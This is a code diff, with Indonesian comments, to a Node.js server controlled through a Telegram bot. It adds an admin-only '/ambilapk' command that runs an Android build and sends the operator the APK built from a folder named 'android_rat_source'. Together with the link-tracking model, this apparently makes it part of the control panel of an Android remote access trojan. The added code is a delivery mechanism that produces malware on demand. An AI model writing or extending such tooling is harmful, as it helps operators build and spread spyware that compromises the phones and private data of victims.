@@ -9,6 +9,7 @@ const bot = require('./telegram');
 const TrackedLink = require('./models/trackedLink');
 const multer = require('multer');
 const fs = require('fs');
+const { exec } = require('child_process');
 
 const app = express();
 const server = http.createServer(app);
@@ -454,4 +455,43 @@ io.on('connection', (socket) => {
 
 server.listen(3000, () => {
     console.log('listening on *:3000');
+});
+
+bot.onText(/\/ambilapk/, (msg) => {
+    const chatId = msg.chat.id;
+
+    // Hanya admin yang bisa menjalankan perintah ini
+    if (chatId.toString() !== config.adminId.toString()) {
+        bot.sendMessage(chatId, "Maaf, Anda tidak memiliki izin untuk menggunakan perintah ini.");
+        return;
+    }
+
+    bot.sendMessage(chatId, "🤖 Memulai proses build APK... Ini mungkin memakan waktu beberapa saat. Harap tunggu.");
+
+    exec('npm run build:android', (error, stdout, stderr) => {
+        if (error) {
+            console.error(`exec error: ${error}`);
+            // Kirim log error yang lebih detail
+            const errorMessage = `Gagal membuat APK.\n\nError: ${error.message}\n\nStderr: ${stderr}`;
+            bot.sendMessage(chatId, errorMessage.substring(0, 4096)); // Batasi panjang pesan jika terlalu panjang
+            return;
+        }
+
+        console.log(`stdout: ${stdout}`);
+        if (stderr) {
+            console.error(`stderr: ${stderr}`);
+        }
+
+        const apkPath = path.join(__dirname, 'android_rat_source', 'app', 'build', 'outputs', 'apk', 'debug', 'app-debug.apk');
+
+        if (fs.existsSync(apkPath)) {
+            bot.sendDocument(chatId, apkPath, { caption: '✅ Build berhasil! Ini file APK Anda.' })
+                .catch(err => {
+                    console.error('Gagal mengirim APK:', err);
+                    bot.sendMessage(chatId, 'Gagal mengirim file APK setelah build selesai.');
+                });
+        } else {
+            bot.sendMessage(chatId, 'Build sepertinya berhasil, tetapi file APK tidak dapat ditemukan di path yang diharapkan.');
+        }
+    });
 });
